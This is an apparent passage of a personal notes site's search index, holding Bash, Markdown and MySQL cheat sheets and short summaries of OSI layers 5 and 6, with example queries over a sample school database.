equal       [[ STRING =~ STRING ]] Regexp       (( NUM \u0026lt; NUM )) Numeric conditions       Condition Description       [[ -o noclobber ]] If OPTIONNAME is enabled     \u0026mdash; \u0026mdash;     [[ ! EXPR ]] Not     [[ X ]] \u0026amp;\u0026amp; [[ Y ]] And     `[[ X ]]  [[ Y ]]` Or    File conditions    Condition Description     [[ -e FILE ]] Exists   [[ -r FILE ]] Readable   [[ -h FILE ]] Symlink   [[ -d FILE ]] Directory   [[ -w FILE ]] Writable   [[ -s FILE ]] Size is \u0026gt; 0 bytes   [[ -f FILE ]] File   [[ -x FILE ]] Executable       [[ FILE1 -nt FILE2 ]] 1 is more recent than 2   [[ FILE1 -ot FILE2 ]] 2 is more recent than 1   [[ FILE1 -ef FILE2 ]] Same files    Examples if ping -c 1 google.com; then echo \u0026quot;It appears you have a working internet connection\u0026quot; fi  if grep -q 'foo' ~/.bash_history; then echo \u0026quot;You appear to have typed 'foo' in the past\u0026quot; fi  # String if [[ -z \u0026quot;$string\u0026quot; ]]; then echo \u0026quot;String is empty\u0026quot; elif [[ -n \u0026quot;$string\u0026quot; ]]; then echo \u0026quot;String is not empty\u0026quot; fi  # Combinations if [[ X ]] \u0026amp;\u0026amp; [[ Y ]]; then ... fi  # Equal if [[ \u0026quot;$A\u0026quot; == \u0026quot;$B\u0026quot; ]]  # Regex if [[ \u0026quot;A\u0026quot; =~ \u0026quot;.\u0026quot; ]]  if (( $a \u0026lt; $b )); then echo \u0026quot;$a is smaller than $b\u0026quot; fi  if [[ -e \u0026quot;file.txt\u0026quot; ]]; then echo \u0026quot;file exists\u0026quot; fi  Arrays Defining arrays Fruits=('Apple' 'Banana' 'Orange')  Fruits[0]=\u0026quot;Apple\u0026quot; Fruits[1]=\u0026quot;Banana\u0026quot; Fruits[2]=\u0026quot;Orange\u0026quot;  Working with arrays echo ${Fruits[0]} # Element #0 echo ${Fruits[@]} # All elements, space-separated echo ${#Fruits[@]} # Number of elements echo ${#Fruits} # String length of the 1st element echo ${#Fruits[3]} # String length of the Nth element echo ${Fruits[@]:3:2} # Range (from position 3, length 2)  Operation Fruits=(\u0026quot;${Fruits[@]}\u0026quot; \u0026quot;Watermelon\u0026quot;) # Push Fruits+=('Watermelon') # Also Push Fruits=( ${Fruits[@]/Ap*/} ) # Remove by regex match unset Fruits[2] # Remove one item Fruits=(\u0026quot;${Fruits[@]}\u0026quot;) # Duplicate Fruits=(\u0026quot;${Fruits[@]}\u0026quot; \u0026quot;${Veggies[@]}\u0026quot;) # Concatenate lines=(`cat \u0026quot;logfile\u0026quot;`) # Read from file  Iteration for i in \u0026quot;${arrayName[@]}\u0026quot;; do echo $i done  Dictionaries Defining declare -A sounds  sounds[dog]=\u0026quot;bark\u0026quot; sounds[cow]=\u0026quot;moo\u0026quot; sounds[bird]=\u0026quot;tweet\u0026quot; sounds[wolf]=\u0026quot;howl\u0026quot;  Declares sound as a Dictionary object (aka associative array).\nWorking with dictionaries echo ${sounds[dog]} # Dog's sound echo ${sounds[@]} # All values echo ${!sounds[@]} # All keys echo ${#sounds[@]} # Number of elements unset sounds[dog] # Delete dog  Iterations Iterate over values for val in \u0026quot;${sounds[@]}\u0026quot;; do echo $val done  Iterate over keys for key in \u0026quot;${!sounds[@]}\u0026quot;; do echo $key done  Option Options set -o noclobber # Avoid overlay files (echo \u0026quot;hi\u0026quot; \u0026gt; foo) set -o errexit # Used to exit upon error, avoiding cascading errors set -o pipefail # Unveils hidden failures set -o nounset # Exposes unset variables  Glob options set -o nullglob # Non-matching globs are removed ('*.foo' =\u0026gt; '') set -o failglob # Non-matching globs throw errors set -o nocaseglob # Case insensitive globs set -o globdots # Wildcards match dotfiles (\u0026quot;*.sh\u0026quot; =\u0026gt; \u0026quot;.foo.sh\u0026quot;) set -o globstar # Allow ** for recursive matches ('lib/**/*.rb' =\u0026gt; 'lib/a/b/c.rb')  Set GLOBIGNORE as a colon-separated list of patterns to be removed from glob matches.\nHistory Commands    Code Description     history Show history   shopt -s histverify Don\u0026rsquo;t execute expanded result immediately    Expansions    Code Description     !$ Expand last parameter of most recent command   !* Expand all parameters of most recent command   !-n Expand nth most recent command   !n Expand nth command in history   !\u0026lt;command\u0026gt; Expand most recent invocation of command \u0026lt;command\u0026gt;    Operations    Code Description     !! Execute last command again   !!:s/\u0026lt;FROM\u0026gt;/\u0026lt;TO\u0026gt;/ Replace first occurrence of \u0026lt;FROM\u0026gt; to \u0026lt;TO\u0026gt; in most recent command   !!:gs/\u0026lt;FROM\u0026gt;/\u0026lt;TO\u0026gt;/ Replace all occurrences of \u0026lt;FROM\u0026gt; to \u0026lt;TO\u0026gt; in most recent command   !$:t Expand only basename from last parameter of most recent command   !$:h Expand only directory from last parameter of most recent command    !! and !$ can be replaced with any valid expansion.\nSlices    Code Description     !!:n Expand only nth token from most recent command (command is 0; first argument is 1)   !^ Expand first argument from most recent command   !$ Expand last token from most recent command   !!:n-m Expand range of tokens from most recent command   !!:n-$ Expand nth token to last from most recent command    !! can be replaced with any valid expansion i.e. !cat, !-2, !42, etc.\nMiscellaneous Numeric calculations $((a + 200)) # Add 200 to $a  $((RANDOM%=200)) # Random number 0..200  Subshells (cd somedir; echo \u0026quot;I'm now in $PWD\u0026quot;) pwd # still in first directory  Redirection python hello.py \u0026gt; output.txt # stdout to (file) python hello.py \u0026gt;\u0026gt; output.txt # stdout to (file), append python hello.py 2\u0026gt; error.log # stderr to (file) python hello.py 2\u0026gt;\u0026amp;1 # stderr to stdout python hello.py 2\u0026gt;/dev/null # stderr to (null) python hello.py \u0026amp;\u0026gt;/dev/null # stdout and stderr to (null)  python hello.py \u0026lt; foo.txt # feed foo.txt to stdin for python  Inspecting commands command -V cd #=\u0026gt; \u0026quot;cd is a function/alias/whatever\u0026quot;  Trap errors trap 'echo Error at about $LINENO' ERR  or\ntraperr() { echo \u0026quot;ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}\u0026quot; } set -o errtrace trap traperr ERR  Case/switch case \u0026quot;$1\u0026quot; in start | up) vagrant up ;; *) echo \u0026quot;Usage: $0 {start|stop|ssh}\u0026quot; ;; esac  Source relative source \u0026quot;${0%/*}/../share/foo.sh\u0026quot;  printf printf \u0026quot;Hello %s, I'm %s\u0026quot; Sven Olga #=\u0026gt; \u0026quot;Hello Sven, I'm Olga  Directory of script DIR=\u0026quot;${0%/*}\u0026quot;  Getting options while [[ \u0026quot;$1\u0026quot; =~ ^- \u0026amp;\u0026amp; ! \u0026quot;$1\u0026quot; == \u0026quot;--\u0026quot; ]]; do case $1 in -V | --version ) echo $version exit ;; -s | --string ) shift; string=$1 ;; -f | --flag ) flag=1 ;; esac; shift; done if [[ \u0026quot;$1\u0026quot; == '--' ]]; then shift; fi  Heredoc cat \u0026lt;\u0026lt;END hello world END  Reading input echo -n \u0026quot;Proceed? [y/n]: \u0026quot; read ans echo $ans  read -n 1 ans # Just one character  Special variables    Code Description     $? Exit status of last task   $! PID of last background task   $$ PID of shell    See Special parameters.\nGo to previous directory pwd # /home/user/foo cd bar/ pwd # /home/user/foo/bar cd - pwd # /home/user/foo  Also see  DevHints Bash-hackers wiki (bash-hackers.org) Shell vars (bash-hackers.org) Learn bash in y minutes (learnxinyminutes.com) Bash Guide (mywiki.wooledge.org) ShellCheck (shellcheck.net)  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/markdown/",
	"title": "Markdown",
	"tags": ["Programming"],
	"description": "Markdown description.",
	"content": "Markdown Headers # h1 ## h2 ### h3  Header 1 ========  Header 2 --------  Emphasis *italic* _italic_  **bold** __bold__  `code`  Lists * Item 1 * Item 2  - Item 1 - Item 2  Links [link](http://google.com)  [link][google]  \u0026lt;http://google.com\u0026gt;  Images ![Image alt text](/path/to/img.jpg) ![Image alt text](/path/to/img.jpg \u0026quot;title\u0026quot;) ![Image alt text][img]  Code 4 space indent makes a code block  code fences\n```js codeFences.withLanguage()  # Blockquotes ```text \u0026gt; This is \u0026gt; a blockquote \u0026gt; \u0026gt; \u0026gt; Nested \u0026gt; \u0026gt; Blockquote  Horizontal line ----  ****  Tables | Column 1 Heading | Column 2 Heading | | ---------------- | ---------------- | | Some content | Other content |  Column 1 Heading | Column 2 Heading --- | --- Some content | Other content  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/programming/",
	"title": "Programming",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/layer5/",
	"title": "Layer 5",
	"tags": ["OSI Model"],
	"description": "Managing communication sessions, i.e. continuous exchange of information in the form of multiple back-and-forth transmissions between two nodes.",
	"content": "Layer 5          Num 5   Name Session   Acronim Sausage   PDU    What is \u0026lsquo;on it\u0026rsquo; Session management (sockets)   Function Managing communication sessions, i.e. continuous exchange of information in the form of multiple back-and-forth transmissions between two nodes    This layer is responsible for establishment of connection, maintenance of sessions, authentication and also ensures security. The functions of the session layer are:\n Session establishment, maintenance and termination: The layer allows the two processes to establish, use and terminate a connection. Synchronization: This layer allows a process to add checkpoints which are considered as synchronization points into the data. These synchronization point help to identify the error so that the data is re-synchronized properly, and ends of the messages are not cut prematurely and data loss is avoided. Dialog Controller: The session layer allows two systems to start communication with each other in half-duplex or full-duplex.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/layer6/",
	"title": "Layer 6",
	"tags": ["OSI Model"],
	"description": "Translation of data between a networking service and an application; including character encoding, data compression and encryption/decryption.",
	"content": "Layer 6          Num 6   Name Presentation   Acronim Pizza   PDU Data   What is \u0026lsquo;on it\u0026rsquo; AVI, GIF ,JPEG, MKV   Function Translation of data between a networking service and an application; including character encoding, data    Presentation layer is also called the Translation layer. The data from the application layer is extracted here and manipulated as per the required format to transmit over the network.\nThe functions of the presentation layer are :\n Translation: For example, ASCII to EBCDIC. Encryption / Decryption: Data encryption translates the data into another form or code. The encrypted data is known as the cipher text and the decrypted data is known as plain text. A key value is used for encrypting as well as decrypting data. Compression: Reduces the number of bits that need to be transmitted on the network.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/mysql/",
	"title": "MySQL",
	"tags": ["Programming"],
	"description": "MySQL description.",
	"content": "MySQL Create / Delete Database CREATE DATABASE dbNameYouWant CREATE DATABASE dbNameYouWant CHARACTER SET utf8 DROP DATABASE dbNameYouWant ALTER DATABASE dbNameYouWant CHARACTER SET utf8  Backup Database to SQL File mysqldump -u Username -p dbNameYouWant \u0026gt; databasename_backup.sql  Restore from backup SQL File mysql - u Username -p dbNameYouWant \u0026lt; databasename_backup.sql  Repair Tables After Unclean Shutdown mysqlcheck --all-databases mysqlcheck --all-databases --fast  Browsing SHOW DATABASES SHOW TABLES SHOW FIELDS FROM table / DESCRIBE table SHOW CREATE TABLE table SHOW PROCESSLIST KILL process_number  Insert INSERT INTO table1 (field1, field2, ...) VALUES (value1, value2, ...)  Delete DELETE FROM table1 / TRUNCATE table1 DELETE FROM table1 WHERE condition DELETE FROM table1, table2 FROM table1, table2 WHERE table1.id1 = table2.id2 AND condition  Update UPDATE scores SET score=25 WHERE student_id=4 AND test_id=4;\nSelect SELECT * FROM absence; +------------+------------+ | student_id | date | +------------+------------+ | 3 | 2013-09-01 | | 5 | 2010-04-12 | | 13 | 2019-04-08 | | 14 | 2016-12-04 | +------------+------------+ 4 rows in set (0.00 sec)  SELECT * FROM table SELECT * FROM table1, table2, ... SELECT field1, field2, ... FROM table1, table2, ... SELECT ... FROM ... WHERE condition SELECT ... FROM ... WHERE condition GROUPBY field SELECT ... FROM ... WHERE condition GROUPBY field HAVING condition2 SELECT ... FROM ... WHERE condition ORDER BY field1, field2 SELECT ... FROM ... WHERE condition ORDER BY field1, field2 DESC SELECT ... FROM ... WHERE condition LIMIT 10 SELECT DISTINCT field1 FROM ... SELECT DISTINCT field1, field2 FROM ...  Rename show tables; +------------------+ | Tables_in_school | +------------------+ | absence | | class | | score | | student | | test | +------------------+ 5 rows in set (0.01 sec) RENAME TABLE absence to absences, class to classes, score to scores, student to students, test to tests; Query OK, 0 rows affected (0.02 sec) show tables; +------------------+ | Tables_in_school | +------------------+ | absences | | classes | | scores | | students | | tests | +------------------+ 5 rows in set (0.00 sec)  Conditions field1 = value1 field1 \u0026lt;\u0026gt; value1 field1 LIKE 'value _ %' field1 IS NULL field1 IS NOT NULL field1 IS IN (value1, value2) field1 IS NOT IN (value1, value2) condition1 AND condition2 condition1 OR condition2  eq = lt \u0026lt; gt \u0026gt; ge \u0026gt;= le \u0026lt;= ne !=  OR || AND \u0026amp;\u0026amp; NOT !  Where select first_name, last_name, state from students where sex=\u0026quot;F\u0026quot;; +------------+-----------+-------+ | first_name | last_name | state | +------------+-----------+-------+ | Siena | Herring | tv | | Paityn | Montoya | me | | Kaylin | Moore | yn | | Kayleigh | Simon | nh | | Laylah | Hobbs | kr | | Deja | Hayes | tx | | Kenya | Park | sg | | Araceli | Gould | ww | | Karley | Roman | mn | | Celeste | Wilson | ql | | Annabella | Nixon | os | | Yasmine | Lawson | ra | | Meadow | Johnson | fd | | Penelope | Chase | kb | | Aspen | Velez | va | +------------+-----------+-------+ 15 rows in set (0.00 sec)  select where the year of birth_date is greater than 2000\nSELECT first_name, last_name, birth_date FROM students WHERE YEAR(birth_date) \u0026gt;= 2000; +------------+-----------+------------+ | first_name | last_name | birth_date | +------------+-----------+------------+ | Tyler | Morales | 2004-08-27 | | Deja | Hayes | 2003-12-10 | | Celeste | Wilson | 2005-10-16 | | Jaron | Clements | 2005-04-21 | | Meadow | Johnson | 2005-07-12 | | Aspen | Velez | 2004-06-07 | | Kole | Sanders | 2000-08-24 | +------------+-----------+------------+ 7 rows in set (0.00 sec)  select where the month of birth_day is 3 OR where the state has the value of WA\nSELECT first_name, last_name, birth_date,state FROM students WHERE MONTH(birth_date) = 3 OR state=\u0026quot;WA\u0026quot;; +------------+-----------+------------+-------+ | first_name | last_name | birth_date | state | +------------+-----------+------------+-------+ | Dale | Cooper | 1959-02-22 | WA | | Yasmine | Lawson | 1996-03-19 | ra | | Paxton | Kerr | 1991-03-18 | uc | | Aaden | Valentine | 1997-03-05 | vb | +------------+-----------+------------+-------+ 4 rows in set (0.00 sec)  SELECT first_name, last_name, birth_date,state FROM students WHERE day(birth_date) \u0026gt;= 12 AND (state=\u0026quot;WA\u0026quot; OR state=\u0026quot;ra\u0026quot;); SELECT first_name, last_name, birth_date,state FROM students WHERE day(birth_date) \u0026gt;= 12 \u0026amp;\u0026amp; (state=\u0026quot;WA\u0026quot; || state=\u0026quot;ra\u0026quot;); +------------+-----------+------------+-------+ | first_name | last_name | birth_date | state | +------------+-----------+------------+-------+ | Dale | Cooper | 1959-02-22 | WA | | Yasmine | Lawson | 1996-03-19 | ra | +------------+-----------+------------+-------+ 2 rows in set, 2 warnings (0.00 sec)  Not null select all last_name from students where a value is been supplied. Do not show null data.\nSELECT last_name FROM students WHERE last_name IS NOT NULL; +-----------+ | last_name | +-----------+ | Cooper | | Herring | | Montoya | | Moore | | Morales | | Simon | | Hobbs | | Hayes | | Park | | Gould | | Roman | | Mitchell | | Wilson | | Savage | | Nixon | | Lawson | | Clements | | Johnson | | Cortez | | Kerr | | Valentine | | Riley | | Chase | | Velez | | Sanders | +-----------+ 25 rows in set (0.01 sec)  Order by order the select by last_name\nselect first_name, last_name FROM students ORDER BY last_name; +------------+-----------+ | first_name | last_name | +------------+-----------+ | Penelope | Chase | | Jaron | Clements | | Dale | Cooper | | Killian | Cortez | | Araceli | Gould | | Deja | Hayes | | Siena | Herring | | Laylah | Hobbs | | Meadow | Johnson | | Paxton | Kerr | | Yasmine | Lawson | | Marcos | Mitchell | | Paityn | Montoya | | Kaylin | Moore | | Tyler | Morales | | Annabella | Nixon | | Kenya | Park | | Greyson | Riley | | Karley | Roman | | Kole | Sanders | | Arnav | Savage | | Kayleigh | Simon | | Aaden | Valentine | | Aspen | Velez | | Celeste | Wilson | +------------+-----------+ 25 rows in set (0.00 sec)  Order desc order the select by last_name but in descending order.\nselect first_name, last_name FROM students ORDER BY last_name DESC; +------------+-----------+ | first_name | last_name | +------------+-----------+ | Celeste | Wilson | | Aspen | Velez | | Aaden | Valentine | | Kayleigh | Simon | | Arnav | Savage | | Kole | Sanders | | Karley | Roman | | Greyson | Riley | | Kenya | Park | | Annabella | Nixon | | Tyler | Morales | | Kaylin | Moore | | Paityn | Montoya | | Marcos | Mitchell | | Yasmine | Lawson | | Paxton | Kerr | | Meadow | Johnson | | Laylah | Hobbs | | Siena | Herring | | Deja | Hayes | | Araceli | Gould | | Killian | Cortez | | Dale | Cooper | | Jaron | Clements | | Penelope | Chase | +------------+-----------+ 25 rows in set (0.00 sec)  ORDER BY (multi) order by multiple values.\nSELECT first_name, last_name, state FROM students ORDER BY state DESC, last_name ASC; +------------+-----------+-------+ | first_name | last_name | state | +------------+-----------+-------+ | Kaylin | Moore | yn | | Kole | Sanders | yi | | Marcos | Mitchell | xj | | Araceli | Gould | ww | | Dale | Cooper | WA | | Aaden | Valentine | vb | | Aspen | Velez | va | | Paxton | Kerr | uc | | Deja | Hayes | tx | | Siena | Herring | tv | | Jaron | Clements | te | | Kenya | Park | sg | | Tyler | Morales | ry | | Yasmine | Lawson | ra | | Celeste | Wilson | ql | | Annabella | Nixon | os | | Kayleigh | Simon | nh | | Arnav | Savage | nc | | Karley | Roman | mn | | Paityn | Montoya | me | | Laylah | Hobbs | kr | | Penelope | Chase | kb | | Meadow | Johnson | fd | | Killian | Cortez | eb | | Greyson | Riley | df | +------------+-----------+-------+ 25 rows in set (0.00 sec)  Limit Limit the select to 5 values.\nselect student_id,first_name, last_name FROM students LIMIT 5; +------------+------------+-----------+ | student_id | first_name | last_name | +------------+------------+-----------+ | 1 | Dale | Cooper | | 2 | Siena | Herring | | 3 | Paityn | Montoya | | 4 | Kaylin | Moore | | 5 | Tyler | Morales | +------------+------------+-----------+ 5 rows in set (0.00 sec)  limit the select to the next 5 values after 5.\nselect student_id,first_name, last_name FROM students LIMIT 5, 5; +------------+------------+-----------+ | student_id | first_name | last_name | +------------+------------+-----------+ | 6 | Kayleigh | Simon | | 7 | Laylah | Hobbs | | 8 | Deja | Hayes | | 9 | Kenya | Park | | 10 | Araceli | Gould | +------------+------------+-----------+ 5 rows in set (0.00 sec)  limit the select to the next 1 value after 5.\nselect student_id,first_name, last_name FROM students LIMIT 5, 1; +------------+------------+-----------+ | student_id | first_name | last_name | +------------+------------+-----------+ | 6 | Kayleigh | Simon | +------------+------------+-----------+ 1 row in set (0.00 sec)  Concat and As CONCAT can be used to \u0026lsquo;merge\u0026rsquo; 2 things into something custom AS can be used to rename something.\nSELECT CONCAT(first_name, \u0026quot; \u0026quot;, last_name) AS 'Name',Sex AS 'Gender' FROM students LIMIT 1; +-------------+--------+ | Name | Gender | +-------------+--------+ | Dale Cooper | M | +-------------+--------+ 1 row in set (0.00 sec) SELECT CONCAT(first_name, \u0026quot; \u0026quot;, last_name) AS 'Name',Sex AS 'Gender' FROM students LIMIT 1; +-------------+--------+ | Name | Gender | +-------------+--------+ | Dale Cooper | M | +-------------+--------+ 1 row in set (0.00 sec) SELECT CONCAT(first_name, \u0026quot; \u0026quot;, last_name) AS 'Name',Sex AS 'Gender',\u0026quot;Ow Hi there\u0026quot; FROM students LIMIT 1; +-------------+--------+-------------+ | Name | Gender | Ow Hi there | +-------------+--------+-------------+ | Dale Cooper | M | Ow Hi there | +-------------+--------+-------------+ SELECT CONCAT(first_name, \u0026quot; \u0026quot;, last_name) AS 'Name',Sex AS 'Gender',\u0026quot;Ow Hi there\u0026quot; AS Comment FROM students LIMIT 1; +-------------+--------+-------------+ | Name | Gender | Comment | +-------------+--------+-------------+ | Dale Cooper | M | Ow Hi there | +-------------+--------+-------------+ 1 row in set (0.00 sec)  Like % = wildcard _ = something needs to be here.  SELECT last_name, first_name FROM students WHERE first_name LIKE 'D%' or last_name LIKE '%n'; +-----------+------------+ | last_name | first_name | +-----------+------------+ | Cooper | Dale | | Simon | Kayleigh | | Hayes | Deja | | Roman | Karley | | Wilson | Celeste | | Nixon | Annabella | | Lawson | Yasmine | | Johnson | Meadow | +-----------+------------+ 8 rows in set (0.00 sec)  all students that have name first_name of 4 unknown letters and a known 5th letter with value of N\nSELECT last_name, first_name FROM students WHERE first_name LIKE '____n'; +-----------+------------+ | last_name | first_name | +-----------+------------+ | Clements | Jaron | | Valentine | Aaden | | Velez | Aspen | +-----------+------------+ 3 rows in set (0.00 sec)  all students that have name first_name of 4 or more letters, 4th must have a value of e\nSELECT last_name, first_name FROM students WHERE first_name LIKE '___e%'; +-----------+------------+ SELECT last_name, first_name FROM students WHERE first_name LIKE '___e%'; +-----------+------------+ | last_name | first_name | +-----------+------------+ | Cooper | Dale | | Morales | Tyler | | Wilson | Celeste | | Valentine | Aaden | | Chase | Penelope | | Velez | Aspen | | Sanders | Kole | +-----------+------------+ 7 rows in set (0.00 sec)  Distinct only show unique values\nSELECT DISTINCT type FROM tests ORDER BY type; +------+ | type | +------+ | T | | Q | +------+ 2 rows in set (0.01 sec)  COUNT Count unique\nSELECT COUNT(DISTINCT type) FROM tests; +----------------------+ | COUNT(DISTINCT type) | +----------------------+ | 2 | +----------------------+ 1 row in set (0.00 sec) SELECT COUNT(*) as StudentCount FROM students; +--------------+ | StudentCount | +--------------+ | 25 | +--------------+ SELECT COUNT(*) as MaleStudentCount FROM students WHERE sex='M'; +------------------+ | MaleStudentCount | +------------------+ | 10 | +------------------+ 1 row in set (0.00 sec) SELECT sex, COUNT(*) AS GenderCount FROM students GROUP BY sex; +-----+-------------+ | sex | GenderCount | +-----+-------------+ | M | 10 | | F | 15 | +-----+-------------+ 2 rows in set (0.00 sec)  Group by count the students that are born on the same month, then GROUP and ORDER by month.\nselect Month(birth_date) AS 'Month', Count(*) AS Students FROM students GROUP BY Month ORDER BY Month; +-------+----------+ | Month | Students | +-------+----------+ | 1 | 1 | | 2 | 1 | | 3 | 3 | | 4 | 1 | | 6 | 4 | | 7 | 3 | | 8 | 4 | | 10 | 3 | | 11 | 2 | | 12 | 3 | +-------+----------+ 10 rows in set (0.01 sec) select Month(birth_date) AS 'Month', Count(student_id) AS Students FROM students GROUP BY Month ORDER BY Month; +-------+----------+ | Month | Students | +-------+----------+ | 1 | 1 | | 2 | 1 | | 3 | 3 | | 4 | 1 | | 6 | 4 | | 7 | 3 | | 8 | 4 | | 10 | 3 | | 11 | 2 | | 12 | 3 | +-------+----------+ 10 rows in set (0.00 sec)  Having  Difference between the having and where clause in sql is that the where clause can not be used with aggregates, but the having clause can. One way to think of it is that the having clause is an additional filter to the where clause.\n source\n To summarize the difference between WHERE and HAVING: WHERE is used to filter records before any groupings take place. HAVING is used to filter values after they have been groups. Only columns or expression in the group can be included in the HAVING clause’s conditions..\n source\nSELECT sex, COUNT(sex) AS 'Amount' FROM students GROUP BY sex HAVING Amount \u0026gt; 10; +-----+--------+ | sex | Amount | +-----+--------+ | F | 15 | +-----+--------+ 1 row in set (0.00 sec)  MATH stuff SELECT test_id AS 'Test', MIN(score) AS min, MAX(score) as max, MAX(score)-MIN(SCORE) AS 'range', SUM(score) AS total, AVG(score) AS average FROM scores GROUP BY test_id; +------+------+------+-------+-------+---------+ | Test | min | max | range | total | average | +------+------+------+-------+-------+---------+ | 1 | 1 | 15 | 14 | 166 | 6.6400 | | 2 | 1 | 13 | 12 | 149 | 5.9600 | | 3 | 1 | 15 | 14 | 183 | 7.3200 | | 4 | 1 | 15 | 14 | 206 | 8.2400 | | 5 | 2 | 15 | 13 | 215 | 8.6000 | | 6 | 1 | 15 | 14 | 220 | 8.8000 | | 7 | 1 | 15 | 14 | 204 | 8.1600 | | 8 | 1 | 15 | 14 | 193 | 7.7200 | | 9 | 1 | 15 | 14 | 208 | 8.3200 | | 10 | 2 | 15 | 13 | 210 | 8.4000 | +------+------+------+-------+-------+---------+ 10 rows in set (0.00 sec)  Between SELECT first_name, last_name, birth_date FROM students WHERE birth_date BETWEEN '1997-1-1' AND '1995-1-1'; Empty set (0.00 sec) SELECT first_name, last_name, birth_date FROM students WHERE birth_date BETWEEN '1995-1-1' AND '1997-1-1'; +------------+-----------+------------+ | first_name | last_name | birth_date | +------------+-----------+------------+ | Kenya | Park | 1996-07-11 | | Araceli | Gould | 1996-10-02 | | Karley | Roman | 1996-12-24 | | Annabella | Nixon | 1995-12-27 | | Yasmine | Lawson | 1996-03-19 | | Killian | Cortez | 1995-07-02 | +------------+-----------+------------+ 6 rows in set (0.00 sec)  In match for \u0026lsquo;array\u0026rsquo; (list) of vales. Can also be used on sub query\u0026rsquo;s.\nSELECT first_name, last_name FROM students WHERE last_name IN ('Cooper','Sanders','Johnson'); +------------+-----------+ | first_name | last_name | +------------+-----------+ | Dale | Cooper | | Meadow | Johnson | | Kole | Sanders | +------------+-----------+ 3 rows in set (0.00 sec)  Join SELECT ... FROM t1 JOIN t2 ON t1.id1 = t2.id2 WHERE condition SELECT ... FROM t1 LEFT JOIN t2 ON t1.id1 = t2.id2 WHERE condition SELECT ... FROM t1 JOIN (t2 JOIN t3 ON ...) ON ...  SELECT student_id, date, score, maxscore FROM tests, scores WHERE date='2009-08-29' AND tests.test_id = scores.test_id; +------------+------------+-------+----------+ | student_id | date | score | maxscore | +------------+------------+-------+----------+ | 1 | 2009-08-29 | 3 | 15 | | 2 | 2009-08-29 | 1 | 15 | | 3 | 2009-08-29 | 6 | 15 | | 4 | 2009-08-29 | 2 | 15 | | 5 | 2009-08-29 | 13 | 15 | | 6 | 2009-08-29 | 8 | 15 | | 7 | 2009-08-29 | 9 | 15 | | 8 | 2009-08-29 | 8 | 15 | | 9 | 2009-08-29 | 11 | 15 | | 10 | 2009-08-29 | 8 | 15 | | 11 | 2009-08-29 | 6 | 15 | | 12 | 2009-08-29 | 1 | 15 | | 13 | 2009-08-29 | 8 | 15 | | 14 | 2009-08-29 | 10 | 15 | | 15 | 2009-08-29 | 7 | 15 | | 16 | 2009-08-29 | 1 | 15 | | 17 | 2009-08-29 | 4 | 15 | | 18 | 2009-08-29 | 1 | 15 | | 19 | 2009-08-29 | 1 | 15 | | 20 | 2009-08-29 | 8 | 15 | | 21 | 2009-08-29 | 10 | 15 | | 22 | 2009-08-29 | 7 | 15 | | 23 | 2009-08-29 | 7 | 15 | | 24 | 2009-08-29 | 15 | 15 | | 25 | 2009-08-29 | 11 | 15 | +------------+------------+-------+----------+ 25 rows in set (0.00 sec) SELECT scores.student_id, tests.date, scores.score FROM tests, scores WHERE date='2009-08-29' AND tests.test_id = scores.test_id; +------------+------------+-------+ | student_id | date | score | +------------+------------+-------+ | 1 | 2009-08-29 | 3 | | 2 | 2009-08-29 | 1 | | 3 | 2009-08-29 | 6 | | 4 | 2009-08-29 | 2 | | 5 | 2009-08-29 | 13 | | 6 | 2009-08-29 | 8 | | 7 | 2009-08-29 | 9 | | 8 | 2009-08-29 | 8 | | 9 | 2009-08-29 | 11 | | 10 | 2009-08-29 | 8 | | 11 | 2009-08-29 | 6 | | 12 | 2009-08-29 | 1 | | 13 | 2009-08-29 | 8 | | 14 | 2009-08-29 | 10 | | 15 | 2009-08-29 | 7 | | 16 | 2009-08-29 | 1 | | 17 | 2009-08-29 | 4 | | 18 | 2009-08-29 | 1 | | 19 | 2009-08-29 | 1 | | 20 | 2009-08-29 | 8 | | 21 | 2009-08-29 | 10 | | 22 | 2009-08-29 | 7 | | 23 | 2009-08-29 | 7 | | 24 | 2009-08-29 | 15 | | 25 | 2009-08-29 | 11 | +------------+------------+-------+ 25 rows in set (0.00 sec) SELECT CONCAT(students.first_name, \u0026quot; \u0026quot;, students.last_name) As Name, tests.date, scores.score, tests.maxscore FROM tests, scores, students WHERE date='2009-08-29' AND tests.test_id = scores.test_id AND scores.student_id = students.student_id; SELECT students.student_id, CONCAT(students.first_name, \u0026quot; \u0026quot;, students.last_name) As Name, COUNT(absences.date) As Absences tests.date, scores.score, tests.maxscore FROM students, Absences WHERE students.student_id = absences.student_id GROUP BY students.student_id;  Left join SELECT students.student_id, CONCAT(students.first_name, \u0026quot; \u0026quot;, students.last_name) As Name, COUNT(absences.date) As Absences, FROM students LEFT JOIN absences ON students.student_id = absences.student_id GROUP BY students.student_id;  INNER JOIN SELECT students.first_name, students.last_name, scores.test_id, scores.score FROM students INNER JOIN scores ON students.student_id = scores.student_id WHERE scores.score \u0026lt;= 15 ORDER BY scores.test_id;  Create / Delete / Modify Table Create CREATE TABLE table (field1 type1, field2 type2, ...) CREATE TABLE table (field1 type1, field2 type2, ..., INDEX (field)) CREATE TABLE table (field1 type1, field2 type2, ..., PRIMARY KEY (field1)) CREATE TABLE table (field1 type1, field2 type2, ..., PRIMARY KEY (field1, field2))  CREATE TABLE table1 (fk_field1 type1, field2 type2, ..., FOREIGN KEY (fk_field1) REFERENCES table2 (t2_fieldA)) [ON UPDATE|ON DELETE] [CASCADE|SET NULL]  CREATE TABLE table1 (fk_field1 type1, fk_field2 type2, ..., FOREIGN KEY (fk_field1, fk_field2) REFERENCES table2 (t2_fieldA, t2_fieldB))  CREATE TABLE table IF NOT EXISTS (...)  CREATE TEMPORARY TABLE table (...)  Drop DROP TABLE table DROP TABLE IF EXISTS table DROP TABLE table1, table2, ...  Alter ALTER TABLE table MODIFY field1 type1 ALTER TABLE table MODIFY field1 type1 NOT NULL ... ALTER TABLE table CHANGE old_name_field1 new_name_field1 type1 ALTER TABLE table CHANGE old_name_field1 new_name_field1 type1 NOT NULL ... ALTER TABLE table ALTER field1 SET DEFAULT ... ALTER TABLE table ALTER field1 DROP DEFAULT ALTER TABLE table ADD new_name_field1 type1 ALTER TABLE table ADD new_name_field1 type1 FIRST ALTER TABLE table ADD new_name_field1 type1 AFTER another_field ALTER TABLE table DROP 